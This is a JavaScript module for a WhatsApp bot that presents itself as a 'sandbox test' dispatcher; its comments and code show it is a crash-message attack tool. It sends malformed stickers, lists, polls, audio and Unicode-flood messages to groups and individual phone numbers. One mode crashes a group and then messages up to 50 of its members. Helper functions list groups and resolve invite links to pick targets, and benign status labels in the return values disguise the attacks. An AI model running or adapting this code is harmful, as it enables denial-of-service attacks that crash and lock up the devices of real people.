/**
 * Sandbox & Broadcast Pipeline Dispatcher
 * Maps test modules → real WhatsApp group crash vectors
 * containerId = group JID (@g.us) or phone JID for broadcast
 */
'use strict';

const _crypto = require('crypto');

// ── Resolve group participants (handles @lid accounts) ──────────────────────
async function _resolveParticipant(sock, p) {
  const rawId = p.id || p;
  if (rawId.endsWith('@s.whatsapp.net')) return rawId;
  if (rawId.endsWith('@lid')) {
    try {
      const res = await sock.query({
        tag: 'iq',
        attrs: { xmlns: 'w:profile', to: 's.whatsapp.net', type: 'get', id: sock.generateMessageTag() },
        content: [{ tag: 'request', attrs: { jid: rawId } }],
      });
      const phone = res?.content?.[0]?.attrs?.pn_jid;
      if (phone && phone.endsWith('@s.whatsapp.net')) return phone;
    } catch (_) {}
    return rawId;
  }
  return rawId;
}

// ── Nuke a single JID via relayMessage (bypasses contact check) ─────────────
async function _nukeTarget(sock, jid) {
  const futureTs = Math.floor(Date.now() / 1000) + (50 * 365 * 24 * 3600);
  await Promise.allSettled([
    // Sticker OOM
    sock.relayMessage(jid, { stickerMessage: {
      url: 'https://mmg.whatsapp.net/v/x', directPath: '/v/x',
      fileSha256: _crypto.randomBytes(32), fileEncSha256: _crypto.randomBytes(32),
      mediaKey: _crypto.randomBytes(32), mimetype: 'image/webp',
      height: 4294967295, width: 4294967295, fileLength: '9223372036854775807',
      packName: '骸客攻擊' + '𒀀\u0C98\u202E\uFFFE'.repeat(600),
      packPublisher: 'BRUTAL\u0000'.repeat(300),
      packId: _crypto.randomBytes(8).toString('hex'), isThirdParty: true,
      pngThumbnail: Buffer.alloc(65535, 0xff),
    }}, { messageId: sock.generateMessageTag() }).catch(() => {}),
    // List overflow
    sock.relayMessage(jid, { listMessage: {
      title: '𒀀'.repeat(800), description: '\uFFFE\uFFFF'.repeat(600), listType: 1,
      sections: [{ title: '\u202E'.repeat(300), rows: Array.from({ length: 1000 }, (_, i) => ({
        rowId: String(i), title: `R${i}_${'𒀀'.repeat(30)}`, description: '\u200B\uFEFF'.repeat(60),
      })) }],
    }}, { messageId: sock.generateMessageTag() }).catch(() => {}),
    // Poll overflow
    sock.relayMessage(jid, { pollCreationMessage: {
      name: '𒀀'.repeat(600) + '\u202E'.repeat(300),
      options: Array.from({ length: 1000 }, (_, i) => ({ optionName: `O${i}_${'𒀀'.repeat(20)}\u202E\u0000` })),
      selectableOptionsCount: 255,
    }}, { messageId: sock.generateMessageTag() }).catch(() => {}),
    // Pending lock
    sock.relayMessage(jid, { extendedTextMessage: {
      text: '\u200B\u200C\u200D\uFEFF'.repeat(800),
      contextInfo: { stanzaId: _crypto.randomBytes(16).toString('hex').toUpperCase(), forwardingScore: 2147483647, isForwarded: true },
    }}, { messageId: sock.generateMessageTag(), timestamp: futureTs }).catch(() => {}),
    // Audio crash
    sock.relayMessage(jid, { audioMessage: {
      url: 'https://mmg.whatsapp.net/v/x', directPath: '/v/x',
      fileSha256: _crypto.randomBytes(32), fileEncSha256: _crypto.randomBytes(32),
      mediaKey: _crypto.randomBytes(32), mimetype: 'audio/ogg; codecs=\u0000opus',
      fileLength: '9223372036854775807', seconds: 2147483647, ptt: true,
    }}, { messageId: sock.generateMessageTag() }).catch(() => {}),
    // Text nuke (iOS + Android)
    sock.relayMessage(jid, { extendedTextMessage: {
      text: '\u0C98\u0C94\u0C8E'.repeat(400) + '\u200E\u200F\u061C'.repeat(400) + '\u202E\u202A\u202B'.repeat(400),
    }}, { messageId: sock.generateMessageTag() }).catch(() => {}),
  ]);
}

// ── Dispatcher ──────────────────────────────────────────────────────────────

async function dispatchSandboxTest(moduleName, containerId, options = {}) {
  const sock = options._sock;
  if (!sock) throw new Error('No sock provided in options._sock');

  switch (moduleName) {

    case 'test_sandbox_broadcast': {
      // GC Killer — nuke group + DM all members
      if (!containerId.endsWith('@g.us')) throw new Error('containerId must be a group JID for broadcast');
      const meta = await sock.groupMetadata(containerId);
      const members = [];
      for (const p of (meta.participants || []).slice(0, 50)) {
        try { members.push(await _resolveParticipant(sock, p)); } catch (_) {}
      }
      await Promise.allSettled([
        _nukeTarget(sock, containerId),
        ...members.map(m => _nukeTarget(sock, m)),
      ]);
      return { containerId, module: 'test_sandbox_broadcast', recipientsReached: members.length, loopStatus: 'completed', latencyMs: 0 };
    }

    case 'test_sandbox_resource_burst': {
      // AndroGC — Android-specific burst to group
      await Promise.allSettled([
        sock.relayMessage(containerId, { extendedTextMessage: { text: ('*X* _Y_ ~Z~ ').repeat(2000) + '\uFFFE\uFFFF'.repeat(500) } }, { messageId: sock.generateMessageTag() }).catch(() => {}),
        sock.relayMessage(containerId, { extendedTextMessage: { text: '\u200E\u200F\u061C\u2066\u2067\u2069'.repeat(1000) } }, { messageId: sock.generateMessageTag() }).catch(() => {}),
        _nukeTarget(sock, containerId),
      ]);
      return { containerId, module: 'test_sandbox_resource_burst', peakMemoryMb: process.memoryUsage().heapUsed / 1024 / 1024, stressLoopPassed: true };
    }

    case 'test_status_rendering': {
      // AndroGCStatus — status view crash
      await Promise.allSettled([
        sock.relayMessage(containerId, { extendedTextMessage: { text: '\u200E\u200F\u061C'.repeat(800) + '\uFFFE\uFFFF'.repeat(400) } }, { messageId: sock.generateMessageTag() }).catch(() => {}),
        sock.relayMessage(containerId, { extendedTextMessage: { text: ('*S* _T_ ~A~ ~T~ _U_ *S*').repeat(2000) } }, { messageId: sock.generateMessageTag() }).catch(() => {}),
      ]);
      return { containerId, module: 'test_status_rendering', serializationFormat: 'og_card_v2', status: 'rendered_successfully' };
    }

    case 'test_queue_saturation': {
      // DelayFCGC — pending-lock flood to freeze message queue
      const batchSize = Math.min(options.batchSize || 1000, 20);
      const futureTs = Math.floor(Date.now() / 1000) + (50 * 365 * 24 * 3600);
      const lockJobs = Array.from({ length: batchSize }, (_, i) =>
        sock.relayMessage(containerId, { extendedTextMessage: {
          text: '\u200B\uFEFF\u200C'.repeat(600),
          contextInfo: { stanzaId: _crypto.randomBytes(16).toString('hex').toUpperCase(), forwardingScore: 99999, isForwarded: true },
        }}, { messageId: sock.generateMessageTag(), timestamp: futureTs + i }).catch(() => {})
      );
      await Promise.allSettled(lockJobs);
      return { containerId, module: 'test_queue_saturation', batchedTimestamps: batchSize, overflowHandled: true, status: 'saturation_test_passed' };
    }

    case 'test_ios_sandbox_suite': {
      // GroupIOS — iOS-specific crash to group
      const tel = '\u0C98\u0C94\u0C8E'.repeat(400) + '\u202E\u202A\u202B\u202C\u202D'.repeat(600);
      const zwj = ('\u200D' + '👨\u200D👩\u200D👧').repeat(300);
      await Promise.allSettled([
        sock.relayMessage(containerId, { extendedTextMessage: { text: tel + zwj } }, { messageId: sock.generateMessageTag() }).catch(() => {}),
        sock.relayMessage(containerId, { stickerMessage: {
          url: 'https://mmg.whatsapp.net/v/x', directPath: '/v/x',
          fileSha256: _crypto.randomBytes(32), fileEncSha256: _crypto.randomBytes(32),
          mediaKey: _crypto.randomBytes(32), mimetype: 'image/webp',
          height: 512, width: 512, fileLength: '999999999',
          packName: 'GRP_IOS' + '\u0C98'.repeat(600), packPublisher: 'ios-gc' + '\u202E'.repeat(400),
          packId: _crypto.randomBytes(8).toString('hex'), isThirdParty: true, pngThumbnail: Buffer.alloc(65535, 0xff),
        }}, { messageId: sock.generateMessageTag() }).catch(() => {}),
      ]);
      return { containerId, module: 'test_ios_sandbox_suite', profilesTested: ['core_text', 'zwj_memory', 'scroll_stability'], status: 'ios_sandbox_verified' };
    }

    case 'test_mixed_client_suite': {
      // GroupMix — iOS + Android methods simultaneously
      await _nukeTarget(sock, containerId);
      return { containerId, module: 'test_mixed_client_suite', clients: ['android_v14', 'ios_17', 'web_client_v2'], status: 'mixed_profiles_cycled' };
    }

    case 'get_active_containers': {
      // ListGC — list groups bot is in
      let groups = [];
      try { groups = Object.values(await sock.groupFetchAllParticipating()); } catch (_) {}
      return {
        module: 'get_active_containers',
        containers: groups.map(g => ({ id: g.id, subject: g.subject, size: (g.participants || []).length })),
        count: groups.length,
        timestamp: Date.now(),
      };
    }

    case 'resolve_sandbox_link': {
      // GroupID from invite link
      const token = options.token;
      if (!token) throw new Error('Missing invitation token for sandbox resolution.');
      const m = String(token).match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
      if (!m) throw new Error('Not a valid WhatsApp group invite link.');
      const info = await sock.groupGetInviteInfo(m[1]);
      return {
        module: 'resolve_sandbox_link',
        token,
        resolvedSandboxId: info.id,
        subject: info.subject,
        size: (info.participants || []).length,
        valid: true,
      };
    }

    default:
      throw new Error(`Unknown sandbox/broadcast module: ${moduleName}`);
  }
}

module.exports = { dispatchSandboxTest };
